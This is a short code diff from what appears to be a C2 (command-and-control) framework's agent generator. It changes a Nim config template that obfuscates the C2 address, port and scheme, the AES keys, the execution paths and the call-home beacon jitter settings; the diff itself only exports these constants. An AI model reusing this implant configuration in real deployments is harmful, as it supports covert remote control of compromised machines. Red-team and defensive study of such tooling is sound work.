@@ -11,21 +11,21 @@ import nimprotect
 
 ############################ CONFIG ############################
 # C2
-let c2_scheme = protectString("{config["listener"]["scheme"]}")
-let c2_address = protectString("{config["listener"]["address"]}")
-let c2_port = {config["listener"]["port"]}
+let c2_scheme* = protectString("{config["listener"]["scheme"]}")
+let c2_address* = protectString("{config["listener"]["address"]}")
+let c2_port* = {config["listener"]["port"]}
 # Agent
-let is_exe = IS_EXE
-let sleep_on_execution = {config["agent"]["sleep_on_execution"]}
-let agent_execution_path_windows = protectString("{config["agent"]["exe"]["execution_path"]}")
-let agent_execution_path_linux = protectString("{config["agent"]["elf"]["execution_path"]}")
-var call_home_timeframe = {config["agent"]["call_home_timeframe"]}
-var call_home_jitter_percent = {config["agent"]["call_home_jitter_percent"]}
+let is_exe* = IS_EXE
+let sleep_on_execution* = {config["agent"]["sleep_on_execution"]}
+let agent_execution_path_windows* = protectString("{config["agent"]["exe"]["execution_path"]}")
+let agent_execution_path_linux* = protectString("{config["agent"]["elf"]["execution_path"]}")
+var call_home_timeframe* = {config["agent"]["call_home_timeframe"]}
+var call_home_jitter_percent* = {config["agent"]["call_home_jitter_percent"]}
 # Communication
-let communication_aes_key = protectString("{config["communication"]["aes_key"]}")
-let communication_aes_iv = protectString("{config["communication"]["aes_iv"]}")
+let communication_aes_key* = protectString("{config["communication"]["aes_key"]}")
+let communication_aes_iv* = protectString("{config["communication"]["aes_iv"]}")
 # Tasks
-let could_not_retrieve = "-"
+let could_not_retrieve* = "-"
 ############################ CONFIG ############################
 """
 
